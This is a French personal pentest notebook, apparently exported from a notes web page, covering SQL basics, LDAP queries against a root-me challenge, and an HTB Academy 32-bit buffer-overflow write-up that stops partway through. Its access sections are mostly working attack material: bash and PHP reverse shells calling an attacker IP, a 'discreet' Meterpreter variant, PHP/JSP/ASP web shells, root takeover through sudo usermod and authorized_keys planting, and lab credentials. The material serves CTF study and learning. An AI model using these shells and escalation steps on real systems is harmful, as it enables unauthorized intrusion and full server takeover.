+Un autre cas d'utilisation de l'injection SQL est de détourner la logique prévue de l'application web. L'exemple le plus courant est le contournement de l'authentification sans fournir une paire valide d'identifiants et de mots de passe. Un autre exemple est l'accès à des fonctionnalités réservées à des utilisateurs spécifiques, comme les panneaux d'administration. Les attaquants peuvent également être en mesure de lire et d'écrire des fichiers directement sur le serveur back-end, ce qui peut à son tour conduire à placer des portes dérobées (backdoors) sur le serveur back-end, à en obtenir le contrôle direct, et finalement à prendre le contrôle de l'ensemble du site web.
+
+Il existe différent type de Base de Données :
+
+# Base de données relationnelles
+
+c'es le plus courant,elle utilise un schéma,un modele,pour dicter la structure des données stockées dans la base de donnée
+
+<img loading="lazy" class="note-img" src="assets/img-20260908171558.png" style="max-width:min(100%, 512px)" alt="Schéma de note">
+
+Nous pouvons lier l'`id` de la table `users` à l'`user_id` de la table `posts` pour récupérer les détails de l'utilisateur pour chaque publication sans stocker tous les détails de l'utilisateur avec chaque publication. Une table peut avoir plus d'une clé, car une autre colonne peut être utilisée comme clé pour la lier à une autre table. Ainsi, par exemple, la colonne `id` peut être utilisée comme clé pour lier la table `posts` à une autre table contenant des commentaires, dont chacun appartient à une publication particulière, et ainsi de suite.
+
+Exemple: MySQL
+# Bases de données non relationnelles
+
+Ce type de Base de donnée aussi nommé NoSQL n'utilise pas de table,ligne,colonnes,clef primaiàre,relations ou schéma.A la place une BDD NoSQL stocke les données en utilisant differents modele de stockage en fonction du type de donnée ce qui rend les BDD No SQL fléxible et tres evolutive
+
+<img loading="lazy" class="note-img" src="assets/img-20260908172105.png" style="max-width:100%%" alt="Schéma de note">
+Schéma
+
+<img loading="lazy" class="note-img" src="assets/img-20260908172153.png" style="max-width:100%%" alt="Schéma de note">
+Format JSON
+
+Exemple : MangoDB
+
+Les injections pour NoSQL sont differente de celle pour les SQL
+
+La commande ci-dessous permet de s'identifier et interagir avec une BDD MySQL/MariaDB
+
+
+```
+mysql -u <user> -p
+```
+
+-u es utiliser pour fournir le nom d'utilisateur
+-p options pour le MDP
+
+si -p doit etre passer vide pour ne pas qu'elle apparaisse dans la commande et qu'on puisse lire l'historique 
+
+on peut le mettre dans la commande mais c'es a évité pour ne pas qu'il sois stocker dans bash_history
+
+<mark>Il ne doit y avoir aucun espace entre '-p' et le mot de passe.</mark>
+
+-h : derfini l'host si il es distant si c es pas spécifier c es le serveur localhost qui es pris
+
+-P: spécifie le port 
+
+<mark>Le port par default de MySQL/MariaDB es 3306</mark>
+
+
+# Langage SQL
+
+# Création de Base de Donnée
+
+Pour creer un BDD dans MySQL la commande es :
+```
+CREATE DATABASE users;
+```
+
+pour creer une BDD pour les users
+
+Chaque introduction doit finir par un point-vigule
+
+La commande :
+
+```
+SHOW DATABASE
+```
+
+cette commande sert a voir les bases de données
+
+la commande :
+
+```
+USE <base de données>
+```
+
+cette commande sert a entrée dans une base de données
+
+<mark>Les instructions SQL ne sont pas sensible a la casse  part contre le nom des BDD es sensibles a la casse</mark> 
+
+# Tables 
+
+Dans les BDD tout es stocker sous forme de tables
+
+Une table es composer de ligne horizontal et de colonne verticale
+
+pour creer une table la commande es :
+
+```
+CREATE TABLE
+```
+
+exemple:
+
+<img loading="lazy" class="note-img" src="assets/img-20260908182938.png" style="max-width:100%%" alt="Schéma de note">
+
+il faut rentré les infos comme ceci :
+
+<img loading="lazy" class="note-img" src="assets/img-20260908183229.png" style="max-width:100%%" alt="Schéma de note">
+
+Une fois rentré la commande pour voir la table es:
+
+```
+SHOW TABLES;
+```
+
+cette commande liste les tables
+
+La commande :
+
+```
+DESCRIBE <Tables>
+```
+elle lis le contenu de la Table
+
+le mots clef AUTO_INCREMENT permet d'incrementé automatiquement l'ID de un a chaque fois qu un élément es a jouté
+
+le mots clef NOT NULL permet de spécifier qu'une colonne n es jamais vide,le mots clef UNIQUE permet que chaque élément es unique.
+
+Exemple :
+
+```
+username VARCHAR(100) UNIQUE NOT NULL,
+```
+
+cette commande permet de garantir qu'un username de 100 caractere max sois unique et que la colonne ne soit jamais vide
+
+le mots clef DEFAULT permet de spécifier la valeur par default par exemple la commande :
+
+```
+date_of_joining DATETIME DEFAULT NOW(),
+```
+
+**`date_of_joining`**  
+Le nom de la colonne — ici, elle sert à stocker la date d'entrée/d'inscription d'un utilisateur (par exemple, la date d'embauche ou d'inscription).
+
+**`DATETIME`**  
+Le type de données de la colonne. `DATETIME` stocke à la fois la **date et l'heure**, au format `YYYY-MM-DD HH:MM:SS` (ex: `2026-09-08 14:30:00`).
+
+C'est différent de :
+
+- `DATE` → stocke uniquement la date (`2026-09-08`)
+- `TIME` → stocke uniquement l'heure (`14:30:00`)
+- `TIMESTAMP` → similaire à `DATETIME`, mais stocké en UTC et affecté par le fuseau horaire du serveur (et a une plage de valeurs plus limitée, jusqu'en 2038)
+
+**`DEFAULT NOW()`**  
+Une valeur par défaut. Si tu insères une ligne sans préciser explicitement de valeur pour `date_of_joining`, MySQL utilisera automatiquement `NOW()`, qui retourne la date et l'heure **actuelles** du serveur au moment de l'insertion.
+
+
+le mots clef PRIMARY KEY que nous pouvons utiliser pour identifier de manière unique chaque enregistrement dans la table, faisant référence à toutes les données d'un enregistrement au sein d'une table pour les bases de données relationnelles, comme nous l'avons vu dans la section précédente. Nous pouvons faire de la colonne `id` la `PRIMARY KEY` pour cette table :
+
+```
+ PRIMARY KEY (id)
+```
+
+la requête final sera :
+
+```
+CREATE TABLE logins (
+    id INT NOT NULL AUTO_INCREMENT,
+    username VARCHAR(100) UNIQUE NOT NULL,
+    password VARCHAR(100) NOT NULL,
+    date_of_joining DATETIME DEFAULT NOW(),
+    PRIMARY KEY (id)
+    );
+```
+
+
+# Instruction SQL
+
+l'instruction INSERT permet d'ajouter quelque chose dans une table de donnée avec la commande :
+
+
+```
+INSERT INTO <nom de la table> VALUES (<column1_value,column2_value.....);
+```
+
+par exemple:
+
+```
+INSERT INTO login VALUES (1,'admin',Passord,'date);
+```
+
+Il es possible d'ommetre de remplir les colonnes avec des valeurs par default telles que id et date_of_joining pour ce faire il faudrai utliser la commande:
+
+```
+INSERT INTO <nom de la table>(column2,column3,...) Values (column2_value,column3_value,...);
+```
+
+<mark>Si on ommer les colonnes avec NOT NULL ça entrainera une erreur comme il faut une valeur obligatoirement</mark> 
+
+Ce qui donnera :
+
+```
+INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');
+```
+
+Dans l'exemple ci-dessus, nous avons inséré une paire nom d'utilisateur-mot de passe tout en omettant les colonnes `id` et `date_of_joining`.
+
+Le password es en clair au dessus il faudrai le passer en hasher
+
+Il es possible d'enregistrer plusieur chose a la fois en les séparant avec des virgules
+
+part exemple:
+
+```
+INSERT INTO logins(username,password) VALUES ('admin','password'),('user','password2');
+```
+
+# Instruction SELECT
+
+Cette instruction permet de recup des infos, cette instruction sert a d'autre chose aussi.
+
+La syntaxe es:
+
+```
+SELECT * FROM <nom de la table>;
+```
+
+ l'* permet de selectionner toutes les colonnes
+L’instruction FROM es utilisé pour désigné la table a partir de laquelle effectuer la selection.
+
+Il es possible aussi de voir les données qui dans des colonnes spécifique avec la commande:
+
+```
+SELECT <nom de la colonne>,.... FROM <nom de la table>;
+```
+
+la commande:
+
+```
+SELECT * FROM <nom de la table>;
+```
+cette commande montre le contenu de la table 
+
+La commande :
+
+```
+SELECT username,password FROM <om de la table>;
+```
+
+Cette commande sert a montrer que les colonnes username,password de la table
+
+# Instruction DROP
+
+L'instruction DROP permet de supprimer une table et des BDD du serveur.
+
+La commande sera :
+
+```
+DROP TABLE <nom de la table>
+```
+
+<mark>Cette commande supprime une table de façon permanente sans confirmation</mark> 
+
+# Instruction ALTER
+
+Cette instruction permet de modifier le nom d'une table et de n'importe lequel des champs ou de suppr ou d'ajouter une nouvelle colonne existante 
+
+Avec la commande ce-dessous on peut ajouter une nouvelle colonne :
+
+```
+ALTER TABLE <nom de la table> ADD <nom de la colonne> INT;
+```
+
+Pour renommer une colonne :
+
+```
+ALTER TABLE <nom de la table> RENAME COLUMN <ancien nom> TO <nouveau nom>;
+```
+
+Pour modifier le type d une donnée d'une colonne ça serai :
+
+```
+ALTER TABLE <nom de la table> MODIFY <nom de la colonne> DATE;
+```
+
+La commande pour supprimer une colonne:
+
+```
+ALTER TABLE <nom de la table> DROP <nom de la commande>;
+```
+
+# Instruction UPDATE
+
+Contrairement a ALTER qui modifie les propriéter d'une table UPDATE met a jour les enregistrement spécifique au soins d'une table en fonction de certaine condition:
+
+La syntaxe es :
+
+```
+UPDATE <nom de la table> SET columnt1=<nouvel valeur>,.... WHERE <condition>;
+```
+
+par exemple:
+
+```
+UPDATE <nom de la table> SET password = 'change_password' WHERE id > 1;
+```
+
+La requête ci-dessus a mis à jour tous les mots de passe dans tous les enregistrements où l'id était supérieur à 1.
+
+==nous devons spécifier la clause 'WHERE' avec UPDATE, afin de préciser quels enregistrements sont mis à jour. 
+
+
+# INSTRUCTION ORDER BY
+
+cette option permet de trier les résultats en spécifiant la colonne par laquelle trier,par défaut les résultats par ordre croissant.
+
+on peut trier croissant avec l'option ASC ou par ordre décroissant l'option es DESC.
+
+La commande sera par exemple:
+
+```
+SELECT * FROM <table_nom> ORDER BY <en focntion de quoi il faut trier> <DESC ou ASC>;
+```
+
+ce qui donnerai :
+
+```
+SELECT * FROM logins ORDER BY password DESC;
+```
+Dans ce cas là le trie es en fonction des passwords par ordre décroissant 
+
+- **`SELECT * FROM logins`** → sélectionner toutes les colonnes de la table `logins`
+- **`ORDER BY password DESC`** → trier les résultats en fonction de la colonne `password`, en ordre décroissant
+
+# INSTRUCTION LIMIT
+
+Cette option permet de limité le nombre de ligne afficher par exemple
+
+```
+SELECT * FROM <nom_table> LIMIT <numéro>;
+```
+
+Ce qui donnerai:
+
+```
+SELECT * FROM logins LIMIT 2;
+```
+
+Cette commande permet d'afficher 2 lignes de la table logins
+
+Pour décaler avec un offset la commande serai:
+
+```
+SELECT * FROM <table_nom> LIMIT <décalage>, <nombre de ligne>;
+```
+
+Par exemple:
+
+```
+SELECT * FROM logins LIMIT 1, 2;
+```
+
+<mark>Note : le décalage marque l'ordre du premier enregistrement à inclure, en commençant par 0. Pour l'exemple ci-dessus, il commence et inclut le 2e enregistrement, et renvoie deux valeurs.</mark>
+
+# INSTRUCTION WHERE
+</script>
+<script type="text/plain" class="note-src" data-id="ldap" data-title="LDAP" data-cat="web" data-desc="Interroger et modifier un annuaire via ldapsearch / ldapmodify." data-tags="ldapsearch,Annuaire" data-cmds="3">
+Pour se connecter a un annuaire LDAP la commande es 
+
+```
+ldapsearch -x -H ldap://sockets.challenges.root-me.pro:32342 \
+  -D "uid=tburch,ou=people,dc=rmp,dc=local" -w 'password' \
+  -b "dc=rmp,dc=local" "(objectClass=*)"
+```
+
+- `ldapsearch` : l’outil qui sert à interroger un annuaire LDAP (comme `curl` pour le web, mais pour LDAP).
+- `-x` : méthode d’authentification “simple” (login + mot de passe classique).
+- `-H ldap://...:32342` : l’adresse du serveur et son port.
+- `-D "uid=tburch,..."` : ton identité, ton “nom d’utilisateur” complet dans l’annuaire.
+- `-w 'password'` : ton mot de passe.
+- `-b "dc=rmp,dc=local"` : le point de départ de la recherche (la racine de l’annuaire).
+- `"(objectClass=*)"` : le filtre de recherche, ici “tout ce qui existe” (l’étoile = joker).
+
+```
+ldapsearch -x -H ldap://sockets.challenges.root-me.pro:32342 \
+  -D "uid=kbernard,ou=people,dc=rmp,dc=local" -w 'WVlck5LR' \
+  -b "dc=rmp,dc=local" "(uid=kbernard)"
+```
+
+- `-D "uid=kbernard,..."` : cette fois tu te présentes comme étant **Karim Bernard**, pas toi.
+- `-w 'WVlck5LR'` : le mot de passe trouvé dans la description.
+- `"(uid=kbernard)"` : tu demandes juste sa fiche, pour vérifier que ça marche.
+
+```
+ldapmodify -x -H ldap://sockets.challenges.root-me.pro:32342 \
+  -D "uid=kbernard,ou=people,dc=rmp,dc=local" -w 'WVlck5LR' \
+  -f add_admin.ldif
+```
+
+- `ldapmodify` : comme `ldapsearch`, mais pour **modifier** l’annuaire au lieu de juste le lire.
+- `-D` et `-w` : toujours connecté en tant que Karim Bernard.
+- `-f add_admin.ldif` : le fichier qui décrit la modification à appliquer (celui du Point 5).
+</script>
+<script type="text/plain" class="note-src" data-id="revshell" data-title="Reverse shells &amp; web shells" data-cat="access" data-desc="Charges utiles, upgrade de TTY, web shells PHP / JSP / ASP." data-tags="Reverse shell,TTY,Web shell" data-cmds="15">
+# Reverse shell typique:
+
+```
+bash -c 'bash -i >& /dev/tcp/<IP>/<PORT ecoute> 0>&1'
+```
+pour ecouter ce port la commande es :
+
+```
+nc -lvnp <PORT>
+```
+
+Reverse shell : cible qui va vers le hacker
+Bind shell hacker vers cible
+
+Un autre reversesehell serai :
+
+```php
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP attaquant> <PORT> >/tmp/f"); ?>
+
+```
+ceci es a mettre dans un fichier a upload dans le serveur et d'écouter avec la commande:
+
+```
+nc -lvnp <PORT>
+```
+
+une fois dans le Reverse shell il es "casser" certaine commande fonctionne pas la commande :
+```shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+**`python -c '...'`** → exécute du code Python directement en ligne de commande.
+
+**`import pty`** → importe le module `pty` (pseudo-terminal) de la bibliothèque standard Python.
+
+**`pty.spawn("/bin/bash")`** → crée un pseudo-terminal et y attache `/bin/bash`, ce qui donne un shell bash **pleinement interact**
+
+il y a des alternatives si python ne fonctionne pas :
+
+```
+script /dev/null -c bash
+```
+
+```
+perl -e 'exec "/bin/bash";'
+```
+
+**`perl -e '...'`** → exécute du code Perl en ligne de commande.
+
+**`exec "/bin/bash"`** → remplace le processus Perl courant par `/bin/bash` (pas de fork, même PID).
+
+Ici il n'y a **pas de magie PTY** : ça fonctionne si le processus parent a déjà un terminal attaché mais que le shell était juste "limité" au niveau des fonctionnalités. C'est moins puissant que `pty.spawn` ou `script`.
+
+```
+# Côté shell obtenu
+Ctrl+Z   # met le shell en arrière-plan
+
+# Côté terminal local
+stty raw -echo; fg
+
+# Puis dans le shell
+reset
+export TERM=xterm
+export SHELL=bash
+```
+il es possible de faire ça aussi pour upgrade le PTY en CTF
+
+# Web Shell:
+
+```php
+<?php system($_REQUEST["cmd"]); ?>
+```
+ci dessus es un Web shell
+
+```JSP
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+```
+
+**`<% ... %>`** → balise d'exécution JSP, le code Java à l'intérieur est exécuté côté serveur.
+
+**`Runtime.getRuntime()`** → récupère l'instance du runtime Java de la JVM en cours.
+
+**`.exec(...)`** → exécute une commande système (comme `system()` en C ou `os.system()` en Python).
+
+**`request.getParameter("cmd")`** → récupère le paramètre `cmd` de la requête HTTP (GET ou POST).
+
+C'est un **webshell JSP** — une backdoor déposée sur un serveur Java (Tomcat, JBoss, GlassFish...).
+
+```ASP
+<% eval request("cmd") %>
+```
+
+**`<% ... %>`** → balise d'exécution ASP, code exécuté côté serveur (identique à JSP visuellement, mais c'est du VBScript).
+
+**`request("cmd")`** → récupère le paramètre `cmd` de la requête HTTP (GET ou POST), équivalent de `$_GET['cmd']` en PHP.
+
+**`eval`** → c'est là que c'est **particulièrement dangereux** : exécute une chaîne comme du **code VBScript** directement.
+
+Trouvé sur des serveurs **Windows/IIS** anciens. Les fichiers ont l'extension `.asp` et tournent sur **Internet Information Services (IIS)** de Microsoft.
+
+C'est une technique classique en pentest sur des cibles Windows legacy
+
+pour télécharger un webshell l’arborescence dépend du serveur utiliser;
+
+| Serveur Web | Webroot par défaut      |
+| ----------- | ----------------------- |
+| `Apache`    | /var/www/html/          |
+| `Nginx`     | /usr/local/inginx/html/ |
+| `IIS`       | c:\inetpub\wwwroot\|    |
+| `XAMPP`     | C:\xampp\htdocs\|       |
+Pour accéder a un webshell :
+
+```
+http://SERVER_IP:PORT/shell.php?cmd=id
+```
+ou avec curl ça donnerai:
+
+```
+curl  http://<IP serveur>:<PORT>/<nom du fichier webshell>?cmd=<commande>
+```
+
+Il es possible d' en coder un en Python pour faire un webshell semi interactif
+
+on peut executer un revershell a partir de metterpreter aussi pour cela il faut utiliser la commande:
+
+```
+ execute -f bash -a "-c 'bash -i >& /dev/tcp/<ip attaque>/<port ecoute> 0>&1'"
+```
+une fois cette commande faite il faudra lancer avant la commande :
+
+```
+nc -lvnp <port  a ecouter>
+```
+
+
+Version bien plus discrete
+
+<mark>Dans meterpreter</mark>
+execute -H -f bash -a "-c  'bash  -i  >&  /dev/tcp/<ip attanquant>/<port ecoute> 0>&1'"
+
+<mark>Dans le nc</mark>
+
+Ctrl+Z
+stty raw -echo; fg
+script /dev/null -c bash
+export TERM=xterm
+stty rows 40 cols 160
+</script>
+<script type="text/plain" class="note-src" data-id="transfert" data-title="Transfert de fichier" data-cat="access" data-desc="HTTP, SCP, base64, netcat, OpenSSL, vérification d&#x27;intégrité." data-tags="HTTP,SCP,netcat,OpenSSL" data-cmds="14">
+l'outil utiliser es curl et wget
+
+Pour télécharger un fichier sur l’hôte distant il faut ouvrir sur la machine oû il y a le fichier avec la commande:
+```
+python3 -m http.server 8000
+```
+
+python3 : interpreteur 
+-m flag de python pour lancer une biblio standard comme un script
+http:server : module pour serveur hhtp de python par default
+8000:port d'écoute
+le port peut être changer
+
+```
+wget http://<IP du serveur Python>:<Port>/<fichier a telecharger>
+```
+cette commande permet de télécharger le fichier
+
+```
+curl http://<IP du serveur python>:<PORT>/<fichier a telecharger> -o <nom du fichier>
+```
+
+alternative a wget si il n'es pas dispo sur le système
+l'option -o permet de spécifier le nom de sortie 
+```
+python -m SimpleHTTPServer 8000
+```
+si le http.server ne marche pas 
+
+
+la commande SCP permet d'envoyer des fichiers par SSH la commande serai:
+
+```
+scp <fichier a envoyer> <user_ssh>@<IP_machine_distante>:<chemin oû mettre le fichier>
+```
+
+Si le serveur a une protection,on peut encoder le fichier en base64 la commande :
+
+```
+base64 <fichier> -w 0
+```
+
+-w 0 défini pas de retour a la ligne
+
+une fois télécharger le fichier dois etre décoder avec la commande:
+
+```
+echo "<fichier encoder>" | base64 -d > <nom de sortie>
+```
+
+Pour valider un fichier la commande es :
+
+```
+file <fichier>
+```
+
+pour verifier l'integriter du fichier si il a bien ete transferer on peut faire la commande :
+
+```
+md5sum <fichier>
+```
+
+il faut la faire sur la machine qui envoie et qui reçois pour voir si c es le meme,si c es le meme c es bon 
+
+IMPORTANT:
+Il faut lire le README
+
+
+si la commande python3 -m http.server 8000 ne fonctionne pas a cause du par feu ou autre il es possible d'envoyer ça par netcat avec la commande:
+
+```bash
+# récepteur
+
+nc -lvp <port> > <fichier.txt>
+
+#Envoyeur
+
+nc <ip receveur> <port ecoute> < <fichier.txt>
+```
+
+pour les fichiers
+
+Pour les dossiers
+
+```bash
+#receveur
+
+nc -lvp <port> | tar -xvf -
+
+#envoyeur
+
+tar -cvf - <dossier> | nc <ip receveur>
+```
+
+Pour etre plus discret on peut utiliser openssl .
+sur le receveur 
+
+```bash
+openssl s_server -port <ecoute> -cert /etc/ssl/certs/ssl-cert-snakeoil.pem -key /etc/ssl/private/ssl-cert-snakeoil.key -quiet > <fichier.txt>
+```
+
+envoyeur
+
+```bash
+openssl s_client -connect <ip receveur>:<port ecoute> -quiet < <fichier.txt>
+```
+
+```
+
+```
+</script>
+<script type="text/plain" class="note-src" data-id="privesc" data-title="Escalade de privilège" data-cat="access" data-desc="Énumération, sudo, SUID, tâches cron et clés SSH." data-tags="sudo,SUID,SSH" data-cmds="8">
+Une élévation de privilege es le fait d'augmenter ses droit de facon horizontal (se connecter a un autre user pour avoir d autre droit) ou vertical (pour devenir superuser)
+
+Pour cela peut aider :
+hacktricks : https://hacktricks.wiki/en/index.html
+sur github il y a le depot https://github.com/swisskyrepo/PayloadsAllTheThings
+
+il existe des scripts d'énumérations telle que :
+Linux:
+Le dépot github https://github.com/rebootuser/LinEnum
+le dépot github https://github.com/sleventyeleven/linuxprivchecker
+
+Windows:
+Le dépot github https://github.com/GhostPack/Seatbelt
+le depot github https://github.com/411Hall/JAWS
+
+il existe un autre outil pour énumerer un serveur es [Privilege Escalation Awesome Scripts SUITE (PEASS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)) car il est bien entretenu pour rester à jour et comprend des scripts pour énumérer Linux et Windows.
+
+
+
+a partir de PEASS le script s'appel LinPEAS,il faudra le mettre sur la cible 
+
+une fois énumérer on pourrai voir la version du noyaux et aller chercher voir  si une CVE existe et si un POC existe
+
+la commande :
+
+```bash
+dpkg -l
+```
+sur Linux pour voir les logiciels installer 
+ou 
+aller voir dans `C:\Program Files` sur Windows
+ce qui permettrai de voir les logiciels installer pour voir si des exploits public existe
+
+il faut voir quel privilege a le user au quel on es connecter avec la commande:
+```bash
+sudo -l
+```
+
+quelque moyen courants pour exploité certains privilèges user:
+
+1. Sudo
+2. SUID
+3. Privilèges de Windows Token
+
+si ```
+```
+User user1 may run the following commands on ExampleServer:
+    (ALL : ALL) ALL
+```
+on peut executer :
+
+```
+sudo su -
+```
+mais il faut connaitre le MDP
+
+si ont voit  par exemple :
+(user : user) NOPASSWD: /bin/echo
+
+on pourrai utiliser :
+
+```
+sudo -u <user> /bin/echo <commande>
+```
+
+la commande /bin/echo es a  titre d'exemple mais il doit etre remplacer par ce que l'on voit apres le NOPASSWD:
+
+Le site https://gtfobins.github.io/ contient des exploit sudo
+
+le site https://lolbas-project.github.io/# contient une liste d'appli Windows qui peut etre exploiter 
+
+Crontab es exploitable aussi
+si on a acces a un fichier en mode ecriture qui a les droit root sur crontab on peut ecrire un script qui nous donnera un reverse shell
+
+Dans les fichier de configuration ou dans le bash_history on pourrai trouver un MDP 
+
+On peut exploité les clef SSH privé 
+
+si on a accès au fichier id_rsa du root on peut s'y connecter avec la commande:
+déja on copie le fichier id_rsa 
+si on peut pas copier le fichier directement alors il faut copier juste le contenu et le copier dans un fichier avec les droit 600
+puis on utilise la commande
+```
+ssh root@<IP> -i id_rsa
+```
+
+si on peut pas ecrire dans le dossier .ssh d'un user, on peut placer notre clef public dans le dossier ssh du user a /home/suer/.ssh/authorized_keys.
+
+Pour cela il faudrai creer une clef avec le commade:
+```
+ssh-keygen -f <fichier de sortie>
+```
+
+dans ce dossier on copier le contenu du <fichier.pub> dans root/.ssh/authorized_keys
+puis pour ce connecter on utilise:
+
+```
+ssh -i <clef privé> root@<ip>
+```
+</script>
+<script type="text/plain" class="note-src" data-id="exploit" data-title="Exploitation de privilèges" data-cat="access" data-desc="Abus de binaires via sudo (vi, usermod) — GTFOBins." data-tags="GTFOBins,vi,usermod" data-cmds="4">
+# Vi
+pour exploiter la vuln sur /bin/vi on tape la commande:
+
+```
+sudo /bin/vi <fichier dont on a les droits root>
+```
+
+Une fois dans le vi taper échap puis :!/bin/bash,on obtient un shell root
+
+# Usermod 
+
+`usermod` est une commande Linux standard d’administration des comptes. Elle sert à modifier un compte existant : changer son identifiant de connexion (`-l`), son répertoire personnel (`-d`, `-m`), son shell (`-s`), ou ses groupes secondaires (`-G`, `-aG`). Elle est normalement réservée à l’administrateur, car elle touche aux droits des utilisateurs.
+
+Pour votre note, retenez qu’autoriser `usermod` via `sudo` sans mot de passe revient à laisser un utilisateur modifier n’importe quel compte, y compris ses appartenances aux groupes privilégiés. Il est donc très risqué de l’accorder sans restriction. Vous pouvez documenter cette règle, son impact et la correction : la retirer, ou la limiter à un compte et des paramètres précis avec demande de mot de passe.
+
+
+cette commande 
+
+```
+openssl passwd -6 <MDP en clair>
+```
+un hash es generer
+
+une fois avec ce hash
+
+puis pour injecter ce hash donc MDP
+
+```
+sudo usermod -p 'hash_obenu' root
+```
+ 
+ Une fois fait,on se connecte directement au root ou un autre user 
+
+on  peut aussi modifier l'UID avec la commande
+
+```
+sudo usermod -u 0 -o <user>
+```
+
+0 étant l'UID reserver au root
+</script>
+<script type="text/plain" class="note-src" data-id="nixbof32" data-title="Write-up — NIXBOF32" data-cat="writeup" data-desc="Buffer overflow sur la pile Linux x86 32-bit (HTB Academy)." data-tags="Buffer overflow,x86,Shellcode,root" data-cmds="4">
+# Write-up — Skills Assessment NIXBOF32 (Stack Buffer Overflow 32-bit)
+
+> **Module** : HTB Academy — *Stack-Based Buffer Overflows on Linux x86* (ACADEMY-NIXBOF32-SKILLS)
+> **Cible** : `10.129.42.191` — hôte `nixbof32skills`
+> **Accès initial** : SSH `htb-student` / `HTB_@cademy_stdnt!`
+> **Objectif** : lire `/root/flag.txt` (nécessite une élévation de privilèges)
+> **Date** : 2026-11-11
+> **Type** : boîte grise (accès utilisateur fourni, binaire local à exploiter)
+> **Statut** : ✅ **RÉSOLU** — `uid=0` obtenu, flag récupéré.
+
+---
+
+## 1. Synthèse exécutive
+
+Le compte utilisateur `htb-student` ne dispose d'aucun droit de lecture sur `/root/flag.txt`.
+Une élévation de privilèges vers `root` est obtenue en **exploitant un dépassement de tampon
+sur la pile** dans un binaire **SUID root** présent dans le répertoire personnel
+(`/home/htb-student/leave_msg`). Le binaire copie une entrée contrôlée par l'attaquant
+(`argv[1]`) dans un tampon de pile de taille fixe via `strcpy()`, sans contrôle de longueur.
+
+Comme le binaire exécute `setresuid(0,0,0)` **avant** la fonction vulnérable, la simple
+exécution de code arbitraire via l'overflow donne directement un **shell root**.
+Les protections mémoire sont **toutes absentes ou désactivées** (ASLR off, pile exécutable,
+pas de stack canary, pas de PIE effectif car ASLR off), ce qui rend l'exploitation
+déterministe par injection de shellcode sur la pile.
+
+| Criticité | Nombre |
+|-----------|:------:|
+| Critique  | 1      |
+| Haut      | 0      |
+| Moyen     | 0      |
+| Bas       | 2 (durcissement : ASLR système désactivé, SUID superflu) |
+
+**Verdict** : compromission complète de l'hôte (root) à partir d'un simple accès utilisateur.
+
+---
+
+## 2. Méthodologie
+
+| Phase | Action |
+|-------|--------|
+| Accès | Connexion SSH avec les identifiants fournis. |
+| Énumération locale | `id`, inventaire des binaires **SUID** (`find / -perm -4000`), inspection du home. |
+| Analyse statique | `file`, `strings`, `readelf -l`, désassemblage `objdump -d -M intel`. |
+| Analyse dynamique | `gdb` (ASLR off) pour localiser le tampon et confirmer l'offset. |
+| Exploitation | Construction d'un payload `NOP sled + shellcode + adresse de retour`, bruteforce de l'adresse de retour (null-free). |
+| Post-exploitation | Lecture de `/root/flag.txt` via le shell root. |
+
+Outils : `ssh`, `find`, `file`, `strings`, `readelf`, `objdump`, `gdb`, `python2` (sur la cible).
+
+---
+
+## 3. Finding
+
+### [CRITIQUE] Dépassement de tampon sur la pile dans un binaire SUID root (`leave_msg`)
+
+- **Localisation** : `/home/htb-student/leave_msg` (SUID root), fonction `leavemsg()`, appel `strcpy()`.
+- **Paramètre vulnérable** : `argv[1]` (le 1er argument de ligne de commande).
+
+#### Description
+
+Le binaire `leave_msg` est **SUID root** (`-rwsr-xr-x 1 root root`). Il s'agit d'un ELF
+**32-bit** non strippé. Sa fonction `leavemsg()` copie `argv[1]` dans un tampon local de
+pile sans aucune vérification de longueur :
+
+```c
+// pseudo-code reconstruit depuis le désassemblage
+void leavemsg(char *arg) {
+    char buf[0x800];                 // tampon à [ebp-0x808]
+    FILE *f = fopen("/home/htb-student/msg.txt", ...);
+    if (!f) { printf("File doesn't exist."); exit(1); }
+    strcpy(buf, arg);                // <-- OVERFLOW : copie non bornée de argv[1]
+    fputs(buf, f);
+    fclose(f);
+}
+
+int main(int argc, char **argv) {
+    setresuid(0, 0, 0);              // <-- euid=uid=suid=0 AVANT l'appel vulnérable
+    leavemsg(argv[1]);
+    puts("Message left for the administrator.");
+}
+```
+
+> ⚠️ Point clé : l'entrée réellement vulnérable est **`argv[1]`**, pas le fichier
+> `msg.txt`. `msg.txt` n'est que le fichier de **sortie** où le tampon est recopié
+> par `fputs()` (c'est pourquoi il finit par contenir le NOP sled + shellcode après
+> exploitation — effet de bord sans importance).
+
+**Désassemblage pertinent** (`objdump -d -M intel`) :
+
+```asm
+leavemsg:
+  push   ebp
+  mov    ebp,esp
+  push   ebx
+  sub    esp,0x804
+  ...
+  lea    eax,[ebp-0x808]      ; dest = tampon
+  push   DWORD PTR [ebp+0x8]  ; src  = argv[1]
+  call   strcpy@plt           ; <-- copie non bornée
+  ...
+  leave
+  ret                         ; <-- retour détourné
+
+main:
+  ...
+  push 0x0 / push 0x0 / push 0x0
+  call setresuid@plt          ; setresuid(0,0,0)
+  ...
+  call leavemsg
+```
+
+#### Conditions d'exploitation (protections absentes)
+
+| Protection | État | Vérification |
+|------------|------|--------------|
+| ASLR | **Désactivé** | `cat /proc/sys/kernel/randomize_va_space` → `0` |
+| NX / pile non exécutable | **Désactivé** | `readelf -l` → `GNU_STACK ... RWE` |
+| Stack canary | **Absent** | aucun `__stack_chk_fail` dans le binaire |
+| PIE | présent mais neutralisé par ASLR off | base fixe `0x56555000` |
+
+Toutes les conditions sont réunies pour un **shellcode injecté sur la pile** avec
+adresses déterministes.
+
+#### Calcul de l'offset
+
+Le tampon est à `ebp-0x808`. L'adresse de retour sauvegardée est à `ebp+4`.
+Offset tampon → adresse de retour :
+
+```
+0x808 (2056) + 4 (sauvegarde EBP) = 2060 octets
+```
+
+L'adresse de retour écrase donc les octets **2060..2063** du payload.
+
+#### Reproduction (étapes)
+
+1. **Confirmer l'absence de droits et le vecteur** :
+   ```bash
+   id                                  # uid=1001(htb-student), pas root
+   cat /root/flag.txt                  # Permission denied
+   ls -la ~/leave_msg                  # -rwsr-xr-x root root  (SUID)
+   file ~/leave_msg                    # ELF 32-bit ... setuid
+   cat /proc/sys/kernel/randomize_va_space   # 0  (ASLR off)
+   readelf -l ~/leave_msg | grep STACK # GNU_STACK ... RWE (NX off)
+   ```
+
+2. **Localiser le tampon** (ASLR off → adresse stable) :
+   ```bash
